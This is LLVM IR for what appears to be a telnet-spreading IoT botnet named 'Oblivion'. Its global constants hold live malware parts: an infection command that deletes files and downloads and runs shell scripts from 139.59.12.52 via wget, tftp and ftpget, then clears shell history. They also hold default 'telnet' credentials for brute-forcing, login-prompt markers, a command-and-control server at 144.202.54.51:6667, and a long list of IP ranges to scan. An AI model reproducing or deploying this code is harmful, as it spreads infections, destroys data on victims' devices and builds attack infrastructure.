; ModuleID = 'host/ir_O2/Oblivion.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infect2 = local_unnamed_addr global i8* getelementptr inbounds ([507 x i8], [507 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [507 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00", align 1
@infect = local_unnamed_addr global i8* getelementptr inbounds ([496 x i8], [496 x i8]* @.str.1, i64 0, i64 0), align 8
@.str.1 = private unnamed_addr constant [496 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@phonepayload = local_unnamed_addr global i8* getelementptr inbounds ([508 x i8], [508 x i8]* @.str.2, i64 0, i64 0), align 8
@.str.2 = private unnamed_addr constant [508 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *; history -c\0D\0A\00", align 1
@usernames = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@.str.3 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@phone = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* null], align 16
@.str.4 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@passwords = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* null], align 16
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* null], align 16
@.str.10 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@.str.17 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@infected = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@.str.20 = private unnamed_addr constant [14 x i8] c"Device Repped\00", align 1
@infectedmessage = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@tmpdirs = local_unnamed_addr global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i8* null], align 16
@.str.21 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.24 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.29 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.31, i32 0, i32 0)], align 8
@.str.31 = private unnamed_addr constant [19 x i8] c"144.202.54.51:6667\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Phonepid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.32 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.35 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.36 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.38 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"112.5.%d.%d\00", align 1
@.str.43 = private unnamed_addr constant [14 x i8] c"117.165.%d.%d\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"85.3.%d.%d\00", align 1
@.str.45 = private unnamed_addr constant [13 x i8] c"41.252.%d.%d\00", align 1
@.str.46 = private unnamed_addr constant [13 x i8] c"104.55.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [13 x i8] c"78.186.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [13 x i8] c"78.189.%d.%d\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"221.120.%d.%d\00", align 1
@.str.50 = private unnamed_addr constant [11 x i8] c"88.5.%d.%d\00", align 1
@.str.51 = private unnamed_addr constant [13 x i8] c"41.254.%d.%d\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"103.20.%d.%d\00", align 1
@.str.53 = private unnamed_addr constant [13 x i8] c"103.47.%d.%d\00", align 1
@.str.54 = private unnamed_addr constant [13 x i8] c"103.57.%d.%d\00", align 1
@.str.55 = private unnamed_addr constant [13 x i8] c"45.117.%d.%d\00", align 1
@.str.56 = private unnamed_addr constant [13 x i8] c"101.51.%d.%d\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"137.59.%d.%d\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"14.204.%d.%d\00", align 1
@.str.59 = private unnamed_addr constant [12 x i8] c"27.50.%d.%d\00", align 1
@.str.60 = private unnamed_addr constant [12 x i8] c"27.54.%d.%d\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"27.98.%d.%d\00", align 1
@.str.62 = private unnamed_addr constant [12 x i8] c"36.32.%d.%d\00", align 1
@.str.63 = private unnamed_addr constant [13 x i8] c"36.248.%d.%d\00", align 1
@.str.64 = private unnamed_addr constant [12 x i8] c"39.64.%d.%d\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"43.253.%d.%d\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"43.230.%d.%d\00", align 1
@.str.67 = private unnamed_addr constant [13 x i8] c"163.53.%d.%d\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"43.245.%d.%d\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"123.25.%d.%d\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"103.54.%d.%d\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"27.255.%d.%d\00", align 1
@.str.72 = private unnamed_addr constant [14 x i8] c"103.204.%d.%d\00", align 1
@.str.73 = private unnamed_addr constant [13 x i8] c"123.24.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [14 x i8] c"113.191.%d.%d\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"113.188.%d.%d\00", align 1
@.str.76 = private unnamed_addr constant [14 x i8] c"113.189.%d.%d\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"14.160.%d.%d\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"14.161.%d.%d\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"14.162.%d.%d\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"14.163.%d.%d\00", align 1
@.str.81 = private unnamed_addr constant [13 x i8] c"14.164.%d.%d\00", align 1
@.str.82 = private unnamed_addr constant [13 x i8] c"14.165.%d.%d\00", align 1
@.str.83 = private unnamed_addr constant [13 x i8] c"14.166.%d.%d\00", align 1
@.str.84 = private unnamed_addr constant [13 x i8] c"14.167.%d.%d\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"14.168.%d.%d\00", align 1
@.str.86 = private unnamed_addr constant [13 x i8] c"14.169.%d.%d\00", align 1
@.str.87 = private unnamed_addr constant [13 x i8] c"14.170.%d.%d\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"14.171.%d.%d\00", align 1
@.str.89 = private unnamed_addr constant [13 x i8] c"14.172.%d.%d\00", align 1
@.str.90 = private unnamed_addr constant [13 x i8] c"14.173.%d.%d\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"14.174.%d.%d\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"14.175.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [13 x i8] c"14.176.%d.%d\00", align 1
@.str.94 = private unnamed_addr constant [13 x i8] c"14.177.%d.%d\00", align 1
@.str.95 = private unnamed_addr constant [13 x i8] c"14.178.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [13 x i8] c"14.179.%d.%d\00", align 1
@.str.97 = private unnamed_addr constant [13 x i8] c"14.180.%d.%d\00", align 1
@.str.98 = private unnamed_addr constant [13 x i8] c"14.181.%d.%d\00", align 1
@.str.99 = private unnamed_addr constant [13 x i8] c"14.182.%d.%d\00", align 1
@.str.100 = private unnamed_addr constant [13 x i8] c"14.183.%d.%d\00", align 1
@.str.101 = private unnamed_addr constant [13 x i8] c"14.184.%d.%d\00", align 1
@.str.102 = private unnamed_addr constant [13 x i8] c"14.185.%d.%d\00", align 1
@.str.103 = private unnamed_addr constant [13 x i8] c"14.186.%d.%d\00", align 1
@.str.104 = private unnamed_addr constant [13 x i8] c"14.187.%d.%d\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"14.188.%d.%d\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"14.189.%d.%d\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"14.190.%d.%d\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"14.191.%d.%d\00", align 1
@.str.109 = private unnamed_addr constant [13 x i8] c"45.121.%d.%d\00", align 1
@.str.110 = private unnamed_addr constant [13 x i8] c"45.120.%d.%d\00", align 1
@.str.111 = private unnamed_addr constant [13 x i8] c"45.115.%d.%d\00", align 1
@.str.112 = private unnamed_addr constant [13 x i8] c"43.252.%d.%d\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"43.240.%d.%d\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"41.174.%d.%d\00", align 1
@.str.115 = private unnamed_addr constant [13 x i8] c"45.127.%d.%d\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"103.30.%d.%d\00", align 1
@.str.117 = private unnamed_addr constant [13 x i8] c"123.16.%d.%d\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"202.44.%d.%d\00", align 1
@.str.119 = private unnamed_addr constant [13 x i8] c"116.93.%d.%d\00", align 1
@.str.120 = private unnamed_addr constant [13 x i8] c"41.253.%d.%d\00", align 1
@.str.121 = private unnamed_addr constant [14 x i8] c"117.173.%d.%d\00", align 1
@.str.122 = private unnamed_addr constant [14 x i8] c"113.190.%d.%d\00", align 1
@.str.123 = private unnamed_addr constant [14 x i8] c"112.196.%d.%d\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"113.178.%d.%d\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"112.45.%d.%d\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"183.223.%d.%d\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"116.71.%d.%d\00", align 1
@.str.128 = private unnamed_addr constant [13 x i8] c"103.44.%d.%d\00", align 1
@.str.129 = private unnamed_addr constant [14 x i8] c"110.235.%d.%d\00", align 1
@.str.130 = private unnamed_addr constant [14 x i8] c"124.253.%d.%d\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"211.237.%d.%d\00", align 1
@.str.132 = private unnamed_addr constant [14 x i8] c"117.175.%d.%d\00", align 1
@.str.133 = private unnamed_addr constant [12 x i8] c"111.9.%d.%d\00", align 1
@.str.134 = private unnamed_addr constant [14 x i8] c"222.252.%d.%d\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"113.174.%d.%d\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"113.160.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"113.161.%d.%d\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"113.162.%d.%d\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"113.163.%d.%d\00", align 1
@.str.140 = private unnamed_addr constant [14 x i8] c"113.164.%d.%d\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"113.165.%d.%d\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"113.166.%d.%d\00", align 1
@.str.143 = private unnamed_addr constant [14 x i8] c"113.167.%d.%d\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"113.168.%d.%d\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"113.169.%d.%d\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"123.17.%d.%d\00", align 1
@.str.147 = private unnamed_addr constant [13 x i8] c"123.21.%d.%d\00", align 1
@.str.148 = private unnamed_addr constant [13 x i8] c"123.22.%d.%d\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"222.253.%d.%d\00", align 1
@.str.150 = private unnamed_addr constant [14 x i8] c"222.254.%d.%d\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"222.255.%d.%d\00", align 1
@.str.152 = private unnamed_addr constant [13 x i8] c"41.208.%d.%d\00", align 1
@.str.153 = private unnamed_addr constant [14 x i8] c"103.198.%d.%d\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"88.248.%d.%d\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"88.105.%d.%d\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"88.247.%d.%d\00", align 1
@.str.157 = private unnamed_addr constant [13 x i8] c"85.105.%d.%d\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"188.3.%d.%d\00", align 1
@.str.159 = private unnamed_addr constant [14 x i8] c"103.203.%d.%d\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"103.55.%d.%d\00", align 1
@.str.161 = private unnamed_addr constant [14 x i8] c"103.220.%d.%d\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"183.233.%d.%d\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"103.242.%d.%d\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"103.14.%d.%d\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"103.195.%d.%d\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"103.214.%d.%d\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"103.218.%d.%d\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"103.225.%d.%d\00", align 1
@.str.169 = private unnamed_addr constant [14 x i8] c"103.228.%d.%d\00", align 1
@.str.170 = private unnamed_addr constant [14 x i8] c"103.231.%d.%d\00", align 1
@.str.171 = private unnamed_addr constant [13 x i8] c"103.60.%d.%d\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"103.248.%d.%d\00", align 1
@.str.173 = private unnamed_addr constant [14 x i8] c"103.253.%d.%d\00", align 1
@.str.174 = private unnamed_addr constant [14 x i8] c"103.255.%d.%d\00", align 1
@.str.175 = private unnamed_addr constant [14 x i8] c"113.176.%d.%d\00", align 1
@.str.176 = private unnamed_addr constant [14 x i8] c"113.175.%d.%d\00", align 1
@.str.177 = private unnamed_addr constant [14 x i8] c"203.134.%d.%d\00", align 1
@.str.178 = private unnamed_addr constant [14 x i8] c"203.210.%d.%d\00", align 1
@.str.179 = private unnamed_addr constant [14 x i8] c"117.176.%d.%d\00", align 1
@.str.180 = private unnamed_addr constant [14 x i8] c"117.171.%d.%d\00", align 1
@.str.181 = private unnamed_addr constant [14 x i8] c"117.162.%d.%d\00", align 1
@.str.182 = private unnamed_addr constant [14 x i8] c"203.150.%d.%d\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"157.119.%d.%d\00", align 1
@.str.184 = private unnamed_addr constant [13 x i8] c"43.228.%d.%d\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"162.12.%d.%d\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"115.220.%d.%d\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"119.157.%d.%d\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"119.150.%d.%d\00", align 1
@.str.190 = private unnamed_addr constant [14 x i8] c"119.151.%d.%d\00", align 1
@.str.191 = private unnamed_addr constant [14 x i8] c"119.152.%d.%d\00", align 1
@.str.192 = private unnamed_addr constant [14 x i8] c"119.153.%d.%d\00", align 1
@.str.193 = private unnamed_addr constant [14 x i8] c"119.154.%d.%d\00", align 1
@.str.194 = private unnamed_addr constant [14 x i8] c"119.155.%d.%d\00", align 1
@.str.195 = private unnamed_addr constant [14 x i8] c"119.156.%d.%d\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"119.158.%d.%d\00", align 1
@.str.197 = private unnamed_addr constant [14 x i8] c"119.159.%d.%d\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"191.24.%d.%d\00", align 1
@.str.199 = private unnamed_addr constant [14 x i8] c"187.119.%d.%d\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"177.215.%d.%d\00", align 1
@.str.201 = private unnamed_addr constant [14 x i8] c"152.241.%d.%d\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"182.185.%d.%d\00", align 1
@.str.203 = private unnamed_addr constant [13 x i8] c"179.80.%d.%d\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"179.81.%d.%d\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"179.82.%d.%d\00", align 1
@.str.206 = private unnamed_addr constant [13 x i8] c"179.83.%d.%d\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"179.84.%d.%d\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"179.86.%d.%d\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"179.87.%d.%d\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"179.88.%d.%d\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"179.89.%d.%d\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"179.90.%d.%d\00", align 1
@.str.213 = private unnamed_addr constant [13 x i8] c"179.91.%d.%d\00", align 1
@.str.214 = private unnamed_addr constant [13 x i8] c"179.92.%d.%d\00", align 1
@.str.215 = private unnamed_addr constant [13 x i8] c"179.93.%d.%d\00", align 1
@.str.216 = private unnamed_addr constant [13 x i8] c"179.94.%d.%d\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"179.95.%d.%d\00", align 1
